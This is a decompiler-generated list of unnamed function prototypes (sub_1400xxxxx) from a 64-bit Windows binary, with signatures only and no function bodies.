__int64 __fastcall sub_140059F10(__int64 a1, __int64 a2, char *a3, __int64 a4);
__int64 __fastcall sub_140059FC0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_14005A150(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
void *sub_14005A240();
void *sub_14005A250();
void *sub_14005A260();
void *sub_14005A270();
void *sub_14005A280();
void *sub_14005A290();
void *sub_14005A2A0();
void *sub_14005A2B0();
void *sub_14005A2C0();
void *sub_14005A2D0();
void *sub_14005A2E0();
void *sub_14005A2F0();
void *sub_14005A300();
void *sub_14005A310();
void *sub_14005A320();
void *sub_14005A330();
void *sub_14005A340();
void *sub_14005A350();
void *sub_14005A360();
void *sub_14005A370();
void *sub_14005A380();
__int64 __fastcall sub_14005A390(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14005A480(__int64 a1, _BYTE *a2, _BYTE *a3, __int64 a4);
__int64 __fastcall sub_14005A640(__int64 a1, __int64 a2, const void *a3);
__int64 __fastcall sub_14005A790(__int64 a1, char *a2, char *a3, size_t a4);
__int64 __fastcall sub_14005AA80(__int64 a1);
__int64 __fastcall sub_14005AAC0(__int64 a1, int a2, int a3, __int64 *a4);
void *sub_14005AE60();
void *sub_14005AE70();
__int64 __fastcall sub_14005AE80(__int64 a1, unsigned __int8 *a2);
__int64 __fastcall sub_14005AEB0(__int64 a1, char *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_14005AFB0(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
__int64 __fastcall sub_14005B0A0(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4);
__int64 __fastcall sub_14005B150(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4);
void *sub_14005B270();
void *sub_14005B280();
void *sub_14005B290();
void *sub_14005B2A0();
__int64 __fastcall sub_14005B2B0(__int64 a1);
__int64 __fastcall sub_14005B2D0(__int64 a1, unsigned __int8 *a2, size_t a3);
__int64 __fastcall sub_14005B310(__int64 a1, __int64 a2);
void *sub_14005B340();
__int64 __fastcall sub_14005B350(__int64 a1, unsigned __int8 *a2, size_t a3);
__int64 __fastcall sub_14005B390(__int64 a1, __int64 a2);
void *sub_14005B3C0();
__int64 __fastcall sub_14005B3D0(__int64 a1);
__int64 __fastcall sub_14005B410(__int64 a1, unsigned __int8 *a2, size_t a3);
__int64 __fastcall sub_14005B480(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005B4D0(__int64 a1, int a2, int a3, unsigned __int8 *a4);
void *sub_14005B6B0();
__int64 __fastcall sub_14005B6C0(__int64 a1);
__int64 __fastcall sub_14005B6E0(__int64 a1, __m128i *a2, unsigned __int64 a3);
__int64 __fastcall sub_14005B720(__int64 a1, char *a2);
void *sub_14005B750();
__int64 __fastcall sub_14005B760(__int64 a1);
__int64 __fastcall sub_14005B780(__int64 a1, __m128i *a2, unsigned __int64 a3);
__int64 __fastcall sub_14005B7C0(__int64 a1, char *a2);
void *sub_14005B7F0();
__int64 __fastcall sub_14005B800(__int64 a1, int a2, int a3, unsigned int *a4);
__int64 __fastcall sub_14005B960(__int64 a1);
__int64 __fastcall sub_14005B980(__int64 a1);
__int64 __fastcall sub_14005B9A0(__int64 a1, unsigned int *a2, size_t a3);
__int64 __fastcall sub_14005B9E0(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_14005BA10(__int64 a1);
__int64 __fastcall sub_14005BA30(__int64 a1);
__int64 __fastcall sub_14005BA50(__int64 a1, char *a2, size_t a3);
__int64 __fastcall sub_14005BA90(__int64 a1, _BYTE *a2);
void *sub_14005BAC0();
void *sub_14005BAD0();
void *sub_14005BAE0();
void *sub_14005BAF0();
void *sub_14005BB00();
__int64 __fastcall sub_14005BB10(__int64 a1);
__int64 __fastcall sub_14005BB30(__int64 a1, unsigned __int8 *a2, size_t a3);
__int64 __fastcall sub_14005BB70(__int64 a1, _QWORD *a2);
void *sub_14005BBA0();
__int64 __fastcall sub_14005BBB0(__int64 a1, unsigned __int8 *a2, size_t a3);
__int64 __fastcall sub_14005BBF0(__int64 a1, __int64 a2);
void *sub_14005BC20();
__int64 __fastcall sub_14005BC30(__int64 a1);
__int64 __fastcall sub_14005BC50(__int64 a1, char *a2, unsigned __int64 a3);
__int64 __fastcall sub_14005BC90(__int64 a1, _OWORD *a2);
void *sub_14005BCC0();
_BOOL8 sub_14005BCD0();
__int64 sub_14005BD00();
__int64 __fastcall sub_14005BD30(__int64 a1);
__int64 __fastcall sub_14005BD80(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005BE10(__int64 a1, const char *a2, char *a3);
__int64 __fastcall sub_14005BEC0(__int64 a1);
__int64 __fastcall sub_14005BEE0(__int64 a1, const char *a2, char *a3, _DWORD *a4);
__int64 __fastcall sub_14005BFA0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005C010(__int64 a1, const char *a2, char *a3);
__int64 __fastcall sub_14005C0C0(__int64 a1);
__int64 __fastcall sub_14005C110(char **a1);
const char *sub_14005C160();
int sub_14005C170();
__int64 __fastcall sub_14005C1B0(__int64 a1, unsigned int a2);
__int64 __fastcall sub_14005C210(int a1);
__int64 __fastcall sub_14005C230(__int64 a1);
__int64 __fastcall sub_14005C2A0(__int64 a1);
__int64 __fastcall sub_14005C310(__int64 a1, __int64 a2);
__int64 sub_14005C320();
void __fastcall sub_14005C340(void *a1);
_DWORD *__fastcall sub_14005C360(int a1, int a2, int a3);
__int64 __fastcall sub_14005C3B0(__int64 a1, int a2);
__int64 __fastcall sub_14005C3C0(__int64 a1, int a2);
__int64 __fastcall sub_14005C3D0(_BYTE *a1, int *a2);
__int64 __fastcall sub_14005C560(_DWORD *a1);
__int64 __fastcall sub_14005C5B0(__int64 a1, unsigned int *a2, size_t a3);
__int64 __fastcall sub_14005C6E0(_DWORD *a1, unsigned int *a2, __int64 a3);
__int64 __fastcall sub_14005DAB0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005DAC0(__int64 a1, __int64 a2);
_DWORD *__fastcall sub_14005DAD0(__int64 a1, __int64 *a2, __int64 (__fastcall *a3)(char *, __int64, _QWORD, _BYTE *), _BYTE *a4);
__int64 __fastcall sub_14005DD50(_QWORD *a1, int a2, __int64 a3);
char __fastcall sub_14005DEB0(_DWORD *a1, unsigned __int64 a2, _BYTE *a3, _BYTE *a4);
__int64 __fastcall sub_14005E300(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14005E320(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14005E340(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14005E360(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 *__fastcall sub_14005E380(_QWORD *a1, int *a2);
__int64 __fastcall sub_14005E580(__int64 a1);
_DWORD *__fastcall sub_14005E5B0(__int64 a1, __int64 a2, __int64 a3, int *a4);
void __fastcall sub_14005E6C0(void **a1);
_QWORD *__fastcall sub_14005E710(_BYTE *a1, int a2);
__int64 __fastcall sub_14005E7D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005E7E0(int a1, __int64 *a2);
void __fastcall sub_14005E840(__int64 **a1);
__int64 __fastcall sub_14005E890(__int64 *a1, __int64 *a2, _QWORD *a3);
void *__fastcall sub_14005E8B0();
__int64 __fastcall sub_14005E910(__int64 **a1, __int64 *a2, __int64 *a3);
__int64 sub_14005E980(__int64 a1, __int64 a2, unsigned int a3, ...);
__int64 __fastcall sub_14005EA30(__int64 a1, __int64 a2, unsigned int a3, char *a4, unsigned int a5, __int64 a6);
__int64 __fastcall sub_14005EB90(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_14005EBB0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_14005EBD0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_14005EBF0(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_14005EC10(unsigned int *a1, unsigned __int8 **a2);
void __fastcall sub_14005EC30(void **a1);
_QWORD *__fastcall sub_14005EC80(_BYTE *a1, int a2);
void *sub_14005ED40();
__int64 __fastcall sub_14005ED50(int a1, __int64 *a2);
void __fastcall sub_14005EE60(unsigned int *a1);
__int64 __fastcall sub_14005EE80(_QWORD *a1, _QWORD *a2, __int64 a3);
__int64 __fastcall sub_14005EEA0(__int64 a1, int a2);
void *sub_14005EEC0();
__int64 __fastcall sub_14005EED0(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_14005EEF0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_14005EF10(unsigned int *a1, unsigned __int8 **a2);
int __fastcall sub_14005EF30(__int64 a1, __int64 a2);
__int64 __fastcall sub_14005EFC0(__int64 a1);
// struct __crt_locale_pointers *__fastcall _LocaleUpdate::GetLocaleT(_LocaleUpdate *__hidden this); idb
__int64 __fastcall sub_14005F000(__int64 a1);
__int64 __fastcall sub_14005F010(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14005F0A0(__int64 a1, unsigned int **a2, int a3, int a4);
__int64 __fastcall sub_14005F0E0(__int64 a1, int a2, int a3, char a4, _BYTE *a5, __int64 (__fastcall *a6)(__int64, const char *, __int64), __int64 a7);
__int64 __fastcall sub_14005F320(__int16 a1, unsigned int (__fastcall *a2)(__int64, char *, __int64), __int64 a3, __int64 a4);
__int64 __fastcall sub_14005F420(unsigned int a1, unsigned __int8 a2, _BYTE *a3, __int64 (__fastcall *a4)(__int64, const char *, __int64), __int64 a5);
__int64 __fastcall sub_14005F5A0(unsigned int (__fastcall *a1)(__int64, char *, __int64), __int64 a2, _BYTE *a3, int a4);
__int64 __fastcall sub_14005F650(unsigned int (__fastcall *a1)(__int64, const char *, __int64), __int64 a2, int a3);
__int64 __fastcall sub_14005F6C0(unsigned int (__fastcall *a1)(__int64, const char *, __int64), __int64 a2, unsigned int **a3, int a4, int a5);
__int64 __fastcall sub_14005FA70(__int64 (__fastcall *a1)(__int64, const char *, __int64), __int64 a2, __int16 a3, __int64 a4);
_BOOL8 __fastcall sub_14005FC40(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14005FC80(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_14005FF60(__int64 a1, int **a2, int a3, int a4);
__int64 __fastcall sub_140060520(__int64 a1, int *a2, int a3);
__int64 __fastcall sub_140060620(__int64 a1, __int64 *a2, int *a3);
__int64 __fastcall sub_140060720(__int64 a1, __int64 a2);
__int64 __fastcall sub_140060770(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400607D0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140060830(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400608A0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140060920(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400609A0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_1400609F0(__int64 a1, _DWORD *a2, int a3);
__int64 __fastcall sub_140060A80(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_140060AB0(_LocaleUpdate *a1, __int64 a2);
__int64 __fastcall sub_140060BB0(__int64 a1, int a2, unsigned int a3);
__int64 __fastcall sub_140060CF0(__int64 a1);
__int64 __fastcall sub_140060D50(__int64 a1);
__int64 __fastcall sub_140060DC0(__int64 a1);
void __fastcall sub_140060EF0(__int64 a1);
__int64 sub_140061410();
__int64 sub_140061460();
__int64 sub_1400614B0();
__int64 sub_140061500();
__int64 sub_140061550();
__int64 sub_1400615A0();
__int64 sub_1400615F0();
__int64 sub_140061640();
__int64 sub_140061690();
__int64 sub_1400616E0();
__int64 sub_140061730();
__int64 sub_140061780();
__int64 sub_1400617D0();
__int64 sub_140061820();
__int64 sub_140061870();
__int64 sub_1400618C0();
__int64 sub_140061910();
__int64 sub_140061960();
__int64 sub_1400619B0();
__int64 sub_140061A00();
__int64 sub_140061A50();
__int64 sub_140061AA0();
__int64 sub_140061AF0();
__int64 sub_140061B40();
__int64 sub_140061B90();
__int64 sub_140061BE0();
__int64 sub_140061C30();
__int64 sub_140061C80();
char **sub_140061CD0();
__int64 __fastcall sub_140061CE0(char *a1, int a2, __int64 a3, __int64 a4, int a5, int *a6, int a7, char *a8);
__int64 __fastcall sub_140062050(_DWORD *a1, __int64 a2, unsigned int a3, __int64 a4, int a5, int a6, int a7);
__int64 __fastcall sub_1400621F0(_DWORD *a1, char *a2, int a3, __int64 a4, int a5, int a6, int a7);
__int64 __fastcall sub_140062490(_DWORD *a1, _BYTE *a2, int a3, __int64 a4, int *a5, int *a6, int a7);
__int64 __fastcall sub_140062820(_DWORD *a1, char *a2, int a3, __int64 a4, int a5, int a6, int a7);
__int64 __fastcall sub_140062A60(_DWORD *a1, _BYTE *a2, int a3, __int64 a4, int *a5, int *a6, int a7);
__int64 __fastcall sub_140062C80(__int64 a1);
__int64 __fastcall sub_140062CF0(__int64 a1, __int64 a2);
void __fastcall sub_140062DA0(void **a1);
_DWORD *__fastcall sub_140062DE0();
__int64 __fastcall sub_140062E50(__int64 a1, __int64 a2, _QWORD *a3);
__int64 __fastcall sub_140062F80(_DWORD **a1, __int64 a2, __int64 a3, int *a4, __int64 a5);
__int64 __fastcall sub_140063120(__int64 a1, char *a2, size_t a3);
__int64 __fastcall sub_140063240(__int64 a1, char *a2, int a3);
__int64 __fastcall sub_1400632E0(__int64 a1, int a2, int a3, __int64 a4);
__int64 __fastcall sub_140063310(__int64 a1, int a2, int a3, __int64 a4);
_QWORD *sub_140063510();
_QWORD *sub_140063590();
_QWORD *sub_140063610();
__int64 *__fastcall sub_140063690(char *a1, size_t a2, char *a3, char *a4, __int64 a5, __int64 a6, unsigned __int64 a7, int *a8);
__int64 __fastcall sub_140063890(unsigned __int8 **a1, char **a2, __int64 a3, unsigned __int64 a4, __int64 a5, unsigned __int64 a6);
__int64 __fastcall sub_140063AD0(_DWORD **a1, unsigned __int64 a2, unsigned __int64 a3, int *a4, void *Src, unsigned __int64 a6, void *a7, unsigned int *a8, int *a9, __int64 a10);
__int64 __fastcall sub_1400642D0(__int64 a1, __int64 a2, unsigned __int64 a3, int *a4, const void *a5, size_t Size, int a7, void *a8, unsigned int *a9, int *a10, __int64 a11);
__int64 __fastcall sub_140064DE0(_QWORD *a1);
__int64 __fastcall sub_140064E10(_QWORD *a1);
__int64 *__fastcall sub_140064F40(char *a1, unsigned __int64 a2, __int64 a3, unsigned __int64 a4, __int64 a5, unsigned __int64 a6, int *a7);
__int64 __fastcall sub_140065140(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_140065190(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_140065200(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140065250(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int a5, __int64 a6);
void *sub_1400652A0();
void *sub_1400652B0();
void *sub_1400652C0();
void *sub_1400652D0();
void *sub_1400652E0();
void *sub_1400652F0();
void *sub_140065300();
void *sub_140065310();
void __fastcall sub_140065320(__int64 **a1);
void *__fastcall sub_140065370();
__int64 __fastcall sub_1400653D0(__int64 a1);
__int64 __fastcall sub_140065450(__int64 a1);
__int64 __fastcall sub_1400654D0(__FrameHandler3::TryBlockMap *a1, __int64 a2);
__int64 __fastcall sub_1400656F0(__FrameHandler3::TryBlockMap *a1, __int64 a2);
__int64 __fastcall sub_1400657F0(_DWORD *a1, _DWORD *a2);
__int64 *__fastcall sub_140065880(__int64 a1);
__int64 *__fastcall sub_140065F80(int *a1);
__int64 __fastcall sub_140066080(__int64 *a1, char **a2, __int64 a3);
__int64 *__fastcall sub_1400660A0(__int64 **a1, char **a2, __int64 a3);
__int64 __fastcall sub_1400661B0(__int64 *a1, char **a2, unsigned int a3);
__int64 __fastcall sub_1400662D0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140066500(__int64 a1, __int64 *a2);
__int64 __fastcall sub_140066840(_DWORD *a1, __int64 a2);
__int64 __fastcall sub_140066B30(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_140066B50(__FrameHandler3::TryBlockMap *a1, unsigned __int8 **a2);
__int64 __fastcall sub_140066C20(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_140066C70(__int64 a1, unsigned __int8 **a2);
__int64 __fastcall sub_140066EA0(__int64 a1, void **a2);
__int64 __fastcall sub_140067000(__int64 *a1, _BYTE **a2, int a3);
__int64 __fastcall sub_1400670C0(__int64 a1, const char *a2, __int64 a3, __int64 a4, int a5);
__int64 __fastcall sub_1400672A0(__int64 a1, __int64 a2, unsigned __int64 a3, int a4);
void *sub_1400673B0();
void __fastcall sub_1400673C0(unsigned int *a1);
void __fastcall sub_1400673E0(_QWORD *a1, _DWORD *a2, _QWORD *a3, _QWORD *a4);
__int64 sub_140067420();
__int64 __fastcall sub_140067440(__int64 *a1, __int64 a2, int a3, __int64 a4);
__int64 __fastcall sub_1400674E0(__int64 *a1, __int64 a2);
__int64 __fastcall sub_140067540(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140067560(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_140067580(int a1, __int64 a2);
void __fastcall sub_1400675C0(unsigned int *a1);
void *sub_1400675E0();
__int64 __fastcall sub_1400675F0(_QWORD *a1, _QWORD *a2, _DWORD *a3, _QWORD *a4, __int64 a5);
__int64 __fastcall sub_140067670(__int64 a1, __int64 a2, int a3, int a4, __int64 a5, __int64 a6, int a7);
__int64 __fastcall sub_140067700(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140067720(int a1, __int64 *a2);
__int64 __fastcall sub_1400677A0(__int64 a1);
__int64 __fastcall sub_140067820(_QWORD *a1, _QWORD *a2, _DWORD *a3, _QWORD *a4, __int64 a5);
void *sub_140067860();
__int64 __fastcall sub_140067870(__int64 a1, __int64 a2, int a3, __int64 a4, __int64 a5, int a6);
__int64 __fastcall sub_1400678F0(_QWORD *a1, __int64 **a2);
_BOOL8 __fastcall sub_140067A00(_BYTE *a1, __m128i *a2, unsigned __int8 *a3);
__int64 __fastcall sub_140067A40(_BYTE *a1, __m128i *a2);
void __fastcall sub_140067BA0(_DWORD *a1, _DWORD *a2, unsigned __int8 a3);
__int64 __fastcall sub_140067D50(_DWORD *a1, unsigned __int8 *a2);
__int64 __fastcall sub_140068020(_DWORD *a1, int *a2);
__int64 __fastcall sub_1400682A0(_DWORD *a1, int *a2, int *a3);
__int64 __fastcall sub_140068BC0(_DWORD *a1, int *a2);
__int64 __fastcall sub_140068DC0(_DWORD *a1, int *a2);
__int64 __fastcall sub_140069360(_DWORD *a1, int *a2);
__int64 __fastcall sub_1400698D0(_BYTE *a1, int *a2);
__int64 __fastcall sub_140069B40(int *a1, _DWORD *a2, int *a3);
__int64 __fastcall sub_140069F10(_DWORD *a1, int *a2);
__int64 __fastcall sub_14006A1E0(__int64 a1, __int64 a2);
void __fastcall sub_14006A5A0(__int64 a1, int a2, char a3);
__int64 __fastcall sub_14006A810(_BYTE *a1, __m128i *a2, unsigned __int8 *a3);
int __fastcall sub_14006B060(const void **a1, __int64 a2);
__int64 __fastcall sub_14006B080(__int64 a1);
__int64 __fastcall sub_14006B0A0(__int64 a1, _BYTE *a2, int a3);
void *__fastcall sub_14006B0C0(int *a1, const void *a2, int a3, __int64 a4, __int64 a5, void *a6, _DWORD *a7);
__int64 __fastcall sub_14006B1E0(__int64 a1, __int64 a2);
void __fastcall sub_14006B2F0(_QWORD *a1);
_QWORD *__fastcall sub_14006B370();
__int64 __fastcall sub_14006B3C0(__int64 a1);
void __fastcall sub_14006B4B0(__int64 *a1, int a2);
_BOOL8 __fastcall sub_14006B500(__int64 a1, __int64 a2, _DWORD *a3);
_BOOL8 __fastcall sub_14006B5B0(__int64 a1, const void *a2, int a3, int *a4, __int64 a5);
__int64 __fastcall sub_14006B820(_QWORD *a1);
__int64 __fastcall sub_14006B850(__int64 a1, int a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14006B880(__int64 a1, int a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_14006BD70(__int64 a1, __int64 a2, int a3, __int64 a4, int *a5, __int64 a6);
__int64 __fastcall sub_14006BED0(unsigned int a1, _QWORD *a2, unsigned int a3, __int64 a4, unsigned int a5, __int64 a6);
__int64 __fastcall sub_14006BF20(_QWORD *a1, int *a2, unsigned int a3, __int64 a4, int a5);
__int64 __fastcall sub_14006C040(unsigned int a1, _QWORD *a2, unsigned int a3, _OWORD *a4, size_t *a5, __int64 a6, size_t a7, __int64 a8);
__int64 __fastcall sub_14006C390(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, int *a5, __int64 a6);
__int64 __fastcall sub_14006C4D0(__int64 a1, int a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_14006C660(_BYTE *a1, int a2, const void *a3, int a4, __int64 a5, int a6);
__int64 __fastcall sub_14006C6A0(_BYTE *a1, int a2, const void *a3, int a4, __int64 a5, int a6, int *a7, __int64 a8);
__int64 __fastcall sub_14006CA90(void *a1, int a2, const void *a3, int a4, int a5, __int64 a6, int a7);
__int64 __fastcall sub_14006CAE0(void *a1, int a2, const void *a3, int a4, int a5, __int64 a6, int a7, int *a8, __int64 a9);
__int64 __fastcall sub_14006CFD0(int a1);
__int64 __fastcall sub_14006D010(_BYTE *a1, int a2, const void *a3, int a4);
__int64 __fastcall sub_14006D0D0(void *a1, __int64 a2, _BYTE *a3, int a4, int a5);
__int64 __fastcall sub_14006D1E0(__int64 a1, _BYTE *a2, __int64 a3, int *a4, __int64 a5, int a6);
__int64 __fastcall sub_14006D560(__int64 a1, __int64 a2, int *a3, int *a4, __int8 *a5, int a6);
void *__fastcall sub_14006D970(__int64 a1, __int64 a2, __int64 a3, _DWORD *a4, int *a5, __int64 a6);
__int64 __fastcall sub_14006DA40(__int64 *a1, __int64 a2, _DWORD *a3);
__int64 __fastcall sub_14006DA80(__int64 *a1, __int64 a2, _DWORD *a3);
__int64 __fastcall sub_14006DB20(__int64 a1, int *a2, __int64 a3);
__int64 __fastcall sub_14006DD90(__int64 a1);
__int64 __fastcall sub_14006DDB0(_QWORD *a1, __int64 a2);
void __fastcall sub_14006DF90(void *a1);
void *__fastcall sub_14006DFD0();
__int64 __fastcall sub_14006E000(__int64 a1);
_QWORD *__fastcall sub_14006E0B0(__int64 a1, __int64 a2, _QWORD *a3);
__int64 __fastcall sub_14006E290(__int64 a1, _QWORD *a2, int *a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_14006E2C0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14006E3F0(__int64 a1, _QWORD *a2, int *a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_14006E420(__int64 a1, _QWORD *a2, int *a3, __int64 a4, __int64 a5, int a6);
__int64 __fastcall sub_14006E5B0(__int64 a1, __int64 a2, __int64 a3, int *a4);
unsigned __int64 __fastcall sub_14006E870(char *a1, char *a2, int a3, unsigned __int64 *a4, int a5);
unsigned __int64 __fastcall sub_14006E9A0(char *a1, char *a2, unsigned __int64 *a3, int a4, int a5, int a6, __int64 a7);
unsigned __int64 __fastcall sub_14006F030(unsigned __int64 *a1, unsigned __int64 *a2, unsigned __int64 *a3, int a4, int a5, int a6, __int64 a7);
__int64 __fastcall sub_14006F5F0(char *a1, char *a2, char *a3, int a4, int a5);
__int64 __fastcall sub_14006F810(__int64 a1, __int64 a2, int *a3);
unsigned __int64 __fastcall sub_14006F9D0(char *a1, char *a2, int a3, unsigned __int64 *a4);
unsigned __int64 *__fastcall sub_14006FAE0(unsigned __int64 *a1, unsigned __int64 *a2, int a3, unsigned __int64 *a4);
__int64 __fastcall sub_14006FCE0(__int64 a1, __int64 a2, __int64 a3, int *a4);
_DWORD *__fastcall sub_14006FDD0(_DWORD *a1, __int64 a2, __int64 *a3, int *a4);
_DWORD *__fastcall sub_14006FE30(_DWORD *a1, __int64 a2, __int64 a3, int *a4);
__int64 *__fastcall sub_140070110(__int64 *a1, __int64 a2);
_DWORD *__fastcall sub_140070220(_DWORD *a1, __int64 a2, __int64 *a3, int *a4, _DWORD *a5);
unsigned __int64 __fastcall sub_140070880(char *a1, char *a2, char *a3, int a4);
__int64 __fastcall sub_1400709C0(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3);
unsigned __int64 __fastcall sub_140070B50(char *a1, char *a2, int a3, unsigned __int64 a4);
unsigned __int64 __fastcall sub_140070E20(unsigned __int64 *a1, unsigned __int64 *a2, _QWORD *a3);
unsigned __int64 __fastcall sub_1400715D0(unsigned __int64 *a1, unsigned __int64 *a2, _QWORD *a3);
unsigned __int64 __fastcall sub_140073520(char *a1, char *a2, int a3, unsigned __int64 a4);
unsigned __int64 __fastcall sub_140073790(unsigned __int64 *a1, unsigned __int64 *a2);
unsigned __int64 __fastcall sub_140073C60(unsigned __int64 *a1, unsigned __int64 *a2);
void __fastcall sub_140074ED0(unsigned __int64 *a1, unsigned __int64 *a2, int a3);
__int64 __fastcall sub_140075060(char *a1, char *a2, char *a3, int a4);
_BYTE *__fastcall sub_1400751A0(__int64 a1, int a2, unsigned __int64 *a3);
__int64 __fastcall sub_1400753D0(__int64 a1);
FILE *__fastcall sub_140075410(const CHAR *a1, const char *a2);
_DWORD *__fastcall sub_1400755F0(unsigned int *a1, __int64 a2, _DWORD **a3);
__int64 __fastcall sub_140075710(unsigned int *a1, __int64 a2);
__int64 __fastcall sub_140075770(__int64 a1, __int64 a2, unsigned int a3);
__int64 __fastcall sub_1400757A0(__int64 a1, __int64 a2, unsigned int a3, int a4);
__int64 __fastcall sub_1400757D0(__int64 (__fastcall *a1)(char *, __int64, __int64), __int64 a2, __int64 a3, __int64 a4, int a5);
__int64 __fastcall sub_140075B30(__int64 a1, unsigned int a2, int a3, __int64 a4, int a5);
__int64 __fastcall sub_140075C40(__int64 a1, unsigned int a2, __int64 a3);
__int64 __fastcall sub_140075C70(_DWORD *a1, __int64 a2);
__int64 __fastcall sub_140075C80(_DWORD *a1, __int64 a2);
__int64 __fastcall sub_140075C90(int *a1, char *a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140075D90(int *a1, char *a2, int a3, __int64 a4, int a5, __int64 a6);
__int64 __fastcall sub_140075EB0(__int64 a1, unsigned int *a2);
void *sub_140075ED0();
void *sub_140075EE0();
__int64 sub_140075EF0();
__int64 __fastcall sub_1400760B0(__int64 a1, unsigned int a2);
int __fastcall sub_140076110(__int64 a1, unsigned int a2, unsigned int a3, _BYTE *a4, __int64 a5);
__int64 __fastcall sub_140076280(__int64 a1, _BYTE *a2, const char *a3, int a4);
int __fastcall sub_140076490(__int64 a1, int a2, unsigned int a3, _BYTE *a4);
void **sub_1400767D0();
void **sub_1400767E0();
void **sub_1400767F0();
void **sub_140076800();
void **sub_140076810();
__int64 __fastcall sub_140076820(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140076AA0(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140076E50(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_1400771D0(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140077620(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 (__fastcall *__fastcall sub_140077950(__int64 *a1))(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140077A10(__int64 a1);
int *__fastcall sub_140077A40(__int64 a1, __int64 **a2, __int64 a3, __int64 a4, int *a5);
void __fastcall sub_140077BC0(__int64 a1);
void __fastcall sub_140077C10(__int64 a1);
__int64 __fastcall sub_140077C60(__int64 a1, __int64 a2);
__int64 __fastcall sub_140077D30(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_140077D90(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140077DF0(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140077E50(__int64 a1, __int64 a2, __int64 a3, int *a4);
_BOOL8 __fastcall sub_140077EB0(__int64 a1, __int64 a2);
void *sub_140077F10();
__int64 __fastcall sub_140077F20(__int64 a1, __int64 a2);
int *__fastcall sub_140077F50(__int64 a1, __int64 *a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400780C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400781B0(__int64 a1, __int64 a2, __int64 a3, int *a4);
void *sub_140078280();
__int64 __fastcall sub_140078290(_QWORD *a1);
void __fastcall sub_140078300(_DWORD **a1);
__int64 __fastcall sub_140078340(__int64 a1);
__int64 __fastcall sub_140078390(__int64 a1, __int64 a2);
__int64 __fastcall sub_140078470(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
_QWORD *__fastcall sub_1400785A0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140078630(__int64 a1);
__int64 __fastcall sub_140078650(__int64 a1, int *a2);
__int64 __fastcall sub_140078730(_QWORD *a1);
void __fastcall sub_1400787A0(_DWORD **a1);
void __fastcall sub_1400787E0(__int64 a1);
__int64 __fastcall sub_140078820(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400788A0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400788D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400789A0(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4);
